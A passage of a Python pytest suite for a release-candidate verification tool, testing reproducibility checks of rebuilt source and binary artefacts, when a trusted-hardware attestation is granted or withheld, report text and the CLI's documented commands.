    assert out["source"]["rule_failures"] == ["zip-extra-fields"]
    assert out["source"]["content_differences"] == []
    assert out["binaries"] == {"mode": "off", "identical": [], "differs": [], "known_divergences_hit": []}


def test_case_4_content_identical_ci_signed_fail() -> None:
    commit = "9988776655443322110000ffeeddccbbaa998877"
    bin_entry = {
        "name": "apache-foo-<version>-bin.tar.gz",
        "kind": "binary-tarball",
        "reproducibility": "byte-identical",
    }
    v = vrc(
        version="3.2.0",
        rc="rc2",
        signing_mode="ci-automated",
        reproducibility_binaries="byte-identical",
        convenience=[bin_entry],
    )
    cmp = compare("content-identical", metadata_differences=["reproducibility check gzip-header fails on A"])
    out = run_repro(
        v,
        skip_repro=True,
        trusted_hardware=True,
        recorded_commit=commit,
        tag_commit=commit,
        epoch=1758412800,
        compare=cmp,
        binary_results=["apache-foo-3.2.0-bin.tar.gz=identical"],
    )
    assert out["status"] == "FAIL" and out["mandatory"] is True
    assert out["source"]["enabled"] is True and out["source"]["verdict"] == "content-identical"
    assert out["source"]["recorded_commit"] == commit and out["source"]["source_date_epoch"] == 1758412800
    assert out["source"]["content_differences"] == []
    assert out["binaries"] == {
        "mode": "byte-identical",
        "identical": ["apache-foo-3.2.0-bin.tar.gz"],
        "differs": [],
        "known_divergences_hit": [],
    }
    assert out["trusted_hardware_asserted"] is True
    assert any("--skip-repro ignored" in n for n in out["notes"])
    assert "--require-identical" in out["paste_recipe"]


def test_case_5_convenience_artefact_differs() -> None:
    commit = "9988776655443322110000ffeeddccbbaa998877"
    entries = [
        {
            "name": "apache-foo-<version>-bin.tar.gz",
            "kind": "binary-tarball",
            "staging": "dist-dev",
            "build_command": "mvn package",
        },
        {
            "name": "registry.example.org/apache/foo:<version>-<rcN>",
            "kind": "container-image",
            "staging": "registry-staging",
            "build_command": "docker build .",
        },
    ]
    v = vrc(version="4.1.0", rc="rc2", reproducibility_binaries="byte-identical", convenience=entries)
    out = run_repro(
        v,
        recorded_commit=commit,
        tag_commit=commit,
        epoch=1758412800,
        compare=compare("identical"),
        binary_results=[
            "apache-foo-4.1.0-bin.tar.gz=identical",
            "registry.example.org/apache/foo:4.1.0-rc2=differs",
        ],
    )
    assert out["status"] == "FAIL" and out["mandatory"] is False
    assert out["source"]["verdict"] == "identical" and out["source"]["content_differences"] == []
    assert out["binaries"] == {
        "mode": "byte-identical",
        "identical": ["apache-foo-4.1.0-bin.tar.gz"],
        "differs": ["registry.example.org/apache/foo:4.1.0-rc2"],
        "known_divergences_hit": [],
    }
    assert out["trusted_hardware_asserted"] is False


def test_tag_moved_fails() -> None:
    out = run_repro(vrc(), tag_commit="ffff" * 10, compare=compare("identical"))
    assert out["status"] == "FAIL" and out["source"]["verdict"] == "tag-moved"


def test_swhid_mismatch_fails_whatever_the_bytes() -> None:
    other = "swh:1:dir:" + "0" * 40
    out = run_repro(vrc(), recorded_swhid=other, compare=compare("identical"))
    assert out["status"] == "FAIL" and out["source"]["swhid_matches"] is False


def test_no_recorded_swhid_reports_the_computed_one() -> None:
    out = run_repro(vrc(), compare=compare("identical"))
    assert out["status"] == "PASS" and out["source"]["swhid_matches"] is None
    assert any(SWHID in n for n in out["notes"])


def test_skip_repro_skips_in_rm_key_mode() -> None:
    out = run_repro(vrc(), skip_repro=True)
    assert out["status"] == "SKIP" and out["mandatory"] is False and out["source"]["enabled"] is False


def test_nothing_enabled_skips() -> None:
    out = run_repro(vrc(reproducibility_source="off"))
    assert out["status"] == "SKIP"


def test_documented_divergence_known_warns_unknown_fails() -> None:
    entry = {
        "name": "foo-<version>.whl",
        "reproducibility": "documented-divergence",
        "known_divergences": ["RECORD: wheel tool version line"],
    }
    v = vrc(convenience=[entry])
    warn = run_repro(v, compare=compare("identical"), binary_results=["foo-1.0.0.whl=known:RECORD"])
    assert warn["status"] == "WARN" and warn["binaries"]["known_divergences_hit"] == ["foo-1.0.0.whl: RECORD"]
    fail = run_repro(v, compare=compare("identical"), binary_results=["foo-1.0.0.whl=known:METADATA"])
    assert fail["status"] == "FAIL" and fail["binaries"]["differs"] == ["foo-1.0.0.whl"]


@pytest.mark.parametrize(
    ("pattern", "known"),
    [
        ("RECORD", True),
        ("record", True),
        ("RECORD: wheel tool version line", True),
        ("REC", False),
        ("R", False),
        ("RECORD: wheel tool version line and METADATA", False),
        ("METADATA RECORD", False),
        ("", False),
    ],
)
def test_known_divergence_is_an_exact_key_or_entry_match(pattern: str, known: bool) -> None:
    entry = {"known_divergences": ["RECORD: wheel tool version line", ": no key", ""]}
    assert repro._known(entry, pattern) is known


def test_known_divergence_empty_key_never_matches() -> None:
    assert not repro._known({"known_divergences": [":", ""]}, "anything")


def test_binary_off_is_stated_as_published_on_trust() -> None:
    v = vrc(convenience=[{"name": "foo-<version>.whl", "reproducibility": "off"}])
    out = run_repro(v, compare=compare("identical"))
    assert out["status"] == "PASS" and any("published on trust" in n for n in out["notes"])


@pytest.mark.parametrize(
    ("kw", "missing"),
    [
        ({"check": None}, "--check"),
        ({"check": []}, "--check"),
        ({"epoch": None}, "--epoch"),
        ({"check": None, "epoch": None}, "--epoch"),
    ],
)
def test_identical_compare_alone_never_passes(kw: dict[str, Any], missing: str) -> None:
    """Without the check report or the recorded epoch the step is pending, so it
    can never PASS and authorize the trusted-hardware attestation."""
    v = vrc(signing_mode="ci-automated")
    out = run_repro(v, trusted_hardware=True, compare=compare("identical"), **kw)
    assert out["status"] is None and any(p.startswith(missing) for p in out["pending"])
    assert report.attestation(v, out, trusted_hardware=True)[0] is False


def test_custom_source_rebuild_lands_where_compare_reads_it() -> None:
    v = vrc(source_archive_method="custom", build_command="mvn -Papache-release package")
    out = run_repro(v, clone="/src/foo", compare=compare("identical"))
    lines = out["paste_recipe"].splitlines()
    source = v.source_artefact
    build = lines.index("( cd /src/foo && mvn -Papache-release package )")
    copy = lines.index(f'cp "/src/foo/<build-output>/{source}" "rebuilt/{source}"')
    cmp_line = next(
        i for i, line in enumerate(lines) if "compare --json" in line and f"rebuilt/{source}" in line
    )
    assert build < copy < cmp_line and "mkdir -p rebuilt" in lines[build:copy]


def test_pending_until_every_result_is_in() -> None:
    v = vrc(convenience=[{"name": "foo-<version>.whl", "reproducibility": "byte-identical"}])
    out = run_repro(v, compare=compare("identical"))
    assert out["status"] is None and out["pending"] == ["--binary foo-1.0.0.whl=…"]


# --------------------------------------------------------------------------- Step 10


def verdict(overall: str = "PASS") -> dict[str, Any]:
    return {
        "step": "verdict",
        "overall": overall,
        "step_summary": [
            {"step": "inventory", "status": "PASS"},
            {"step": "reproducibility", "status": "PASS"},
        ],
        "skip_steps": [],
        "unresolved": [],
    }


def step9(
    status: str = "PASS", verdict_: str = "identical", differs: list[str] | None = None
) -> dict[str, Any]:
    return {
        "step": "reproducibility",
        "status": status,
        "source": {"verdict": verdict_, "recorded_commit": COMMIT, "source_date_epoch": 1758412800},
        "binaries": {"mode": "off", "identical": [], "differs": differs or [], "known_divergences_hit": []},
    }


def run_report(v: VerifyRc, **kw: Any) -> dict[str, Any]:
    verdict_json = kw.pop("verdict_json", verdict())
    args: dict[str, Any] = {
        "repro": step9(),
        "rebuilt_sha512": "abc",
        "staging_url": None,
        "utc": "2026-10-12T10:00:00Z",
        "post_to": "https://github.com/apache/foo/issues/300",
        "trusted_hardware": True,
        "committer": "jdoe",
        "findings": [],
        "fail_details": [],
        "warn_details": [],
    } | kw
    return report.report(v, verdict_json, **args)


def test_attestation_only_with_signing_identical_and_trusted_hardware() -> None:
    v = vrc(signing_mode="ci-automated")
    out = run_report(v)
    assert out["reproducibility_attestation"] is True
    assert "**Reproducibility validated on trusted hardware**" in out["post_to_comment"]
    assert f"commit `{COMMIT}`" in out["post_to_comment"] and "@jdoe" in out["post_to_comment"]


@pytest.mark.parametrize(
    ("kw", "why"),
    [
        ({"trusted_hardware": False}, "--trusted-hardware"),
        ({"repro": step9("WARN", "content-identical")}, "WARN"),
        ({"repro": step9("FAIL", "identical", ["foo.whl"])}, "FAIL"),
    ],
)
def test_no_attestation_says_why(kw: dict[str, Any], why: str) -> None:
    out = run_report(vrc(signing_mode="ci-automated"), **kw)
    assert out["reproducibility_attestation"] is False
    assert "Reproducibility validated on trusted hardware" not in out["post_to_comment"]
    assert "No trusted-hardware attestation" in out["post_to_comment"] and why in out["post_to_comment"]


def test_attestation_fails_closed_on_an_artefact_never_shown_identical() -> None:
    """A convenience artefact that was skipped or never rebuilt carries no evidence:
    nothing failed, but the attestation must still be withheld."""
    wheel = {"name": "foo-1.0.0.whl", "build_command": "make wheel", "reproducibility": "byte-identical"}
    v = vrc(signing_mode="ci-automated", convenience=[wheel])
    out = run_report(v)  # step9(): differs empty, identical empty
    assert out["reproducibility_attestation"] is False
    assert (
        "foo-1.0.0.whl" in out["post_to_comment"]
        and "Reproducibility validated on trusted hardware" not in out["post_to_comment"]
    )
    shown = step9()
    shown["binaries"]["identical"] = ["foo-1.0.0.whl"]
    assert run_report(v, repro=shown)["reproducibility_attestation"] is True


def test_container_image_divergence_keeps_its_tag_in_the_report() -> None:
    image = {
        "name": "registry.example.org/foo:<version>",
        "reproducibility": "documented-divergence",
        "known_divergences": ["timestamps: layer mtimes"],
    }
    v = vrc(signing_mode="ci-automated", convenience=[image])
    step = run_repro(
        v, compare=compare("identical"), binary_results=["registry.example.org/foo:1.0.0=known:timestamps"]
    )
    assert step["binaries"]["known_divergences_hit"] == ["registry.example.org/foo:1.0.0: timestamps"]
    out = run_report(v, repro=step)
    assert "- `registry.example.org/foo:1.0.0`: warn" in out["text"]
    assert "not checked" not in out["text"]
    assert out["attestation_withheld_because"] == "Step 9 is WARN, not PASS"
    passed = step | {"status": "PASS"}
    why = report.attestation(v, passed, trusted_hardware=True)[1]
    assert why == "not every artefact is identical (registry.example.org/foo:1.0.0)"


def test_rm_key_mode_never_attests() -> None:
    out = run_report(vrc())
    assert out["reproducibility_attestation"] is False
    assert "trusted hardware" not in out["post_to_comment"]


def test_reminder_in_every_report_and_no_comment_without_post_to() -> None:
    for overall in ("PASS", "PASS-WITH-WARNINGS", "FAIL"):
        out = run_report(vrc(), post_to=None, verdict_json=verdict(overall))
        assert out["overall"] == overall and out["voter_obligation_reminder"] is True
        assert VOTER_OBLIGATION_REMINDER in out["text"]
        assert out["post_to_comment"] is None and out["reproducibility_attestation"] is False


def test_unresolved_verdict_is_refused() -> None:
    with pytest.raises(VerifyError):
        run_report(vrc(), verdict_json=verdict() | {"overall": None, "unresolved": ["notice-license"]})


SKILL_DIR = Path(__file__).resolve().parents[3] / "plugins" / "magpie-release-management" / "skills"


def test_reminder_literal_matches_the_skill() -> None:
    """Golden rule 4's reminder is the same text in the skill and in code."""
    text = (SKILL_DIR / "verify-rc" / "SKILL.md").read_text(encoding="utf-8")
    for line in VOTER_OBLIGATION_REMINDER.splitlines():
        assert line in text


def test_attestation_title_is_what_release_promote_reads() -> None:
    assert report.ATTESTATION_TITLE in (SKILL_DIR / "promote" / "SKILL.md").read_text(encoding="utf-8")


# --------------------------------------------------------------------------- CLI


def test_cli_nexus_from_files(tmp_path: Path, capsys: pytest.CaptureFixture[str]) -> None:
    load = tmp_path / "load.json"
    load.write_text(json.dumps(loaded(nexus_staging_repo="orgapachefoo-1024")), encoding="utf-8")
    inventory = tmp_path / "inv.json"
    inventory.write_text(
        json.dumps({"step": "inventory", "found": [], "unexpected": JVM_NAMES}), encoding="utf-8"
    )
    crawl = tmp_path / "crawl.txt"
    crawl.write_text(crawl_text("1.0.0"), encoding="utf-8")
    rc = main(
        [
            "verify-rc",
            "nexus",
            "--load",
            str(load),
            "--inventory",
            str(inventory),
            "--existence-code",
            "200",
            "--crawl",
            str(crawl),
        ]
    )
    out = json.loads(capsys.readouterr().out)
    assert rc == 0 and out["status"] == "WARN"


def test_cli_bad_input_exits_2(tmp_path: Path, capsys: pytest.CaptureFixture[str]) -> None:
    load = tmp_path / "load.json"
    load.write_text(json.dumps({"metadata": {}}), encoding="utf-8")
    assert main(["verify-rc", "args", "--load", str(load)]) == 2
    assert json.loads(capsys.readouterr().out)["ok"] is False


def _documented_commands() -> set[str]:
    """Every `<verify-rc> <command>` / `release-management verify-rc <command>` the skill documents."""
    found: set[str] = set()
    pattern = re.compile(r"(?:<verify-rc>|release-management verify-rc) ([a-z][a-z-]*)")
    for doc in (SKILL_DIR / "verify-rc").rglob("*.md"):
        found |= set(pattern.findall(doc.read_text(encoding="utf-8")))
    return found - {"command"}  # the `<verify-rc>` definition's own `<command>` placeholder


def test_cli_source_tree_takes_the_documented_load(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    load = tmp_path / "verify-rc-load.json"
    load.write_text(json.dumps(loaded()), encoding="utf-8")
    links = tmp_path / "symlinks.json"
    links.write_text(json.dumps(symlinks("REVIEW", ["make check-links"])), encoding="utf-8")
    rc = main(
        [
            "verify-rc",
            "source-tree",
            "--load",
            str(load),
            "--symlinks",
            str(links),
            "--validator-result",
            "0",
        ]
    )
    out = json.loads(capsys.readouterr().out)
    assert rc == 0 and out["status"] == "PASS"


def test_every_documented_command_accepts_load(tmp_path: Path, capsys: pytest.CaptureFixture[str]) -> None:
    commands = _documented_commands()
    assert commands == {"args", "rat", "source-tree", "jvm", "nexus", "repro", "report"}
    load = tmp_path / "verify-rc-load.json"
    load.write_text(json.dumps(loaded()), encoding="utf-8")
    links = tmp_path / "symlinks.json"
    links.write_text(json.dumps(symlinks("PASS", [])), encoding="utf-8")
    verdict_file = tmp_path / "verdict.json"
    verdict_file.write_text(json.dumps(verdict()), encoding="utf-8")
    required = {"source-tree": ["--symlinks", str(links)], "report": ["--verdict", str(verdict_file)]}
    for command in sorted(commands):
        try:
            main(["verify-rc", command, "--load", str(load), *required.get(command, [])])
        except SystemExit as exc:  # argparse rejected the documented form
            pytest.fail(f"`verify-rc {command} --load ...` is rejected: exit {exc.code}")
        capsys.readouterr()
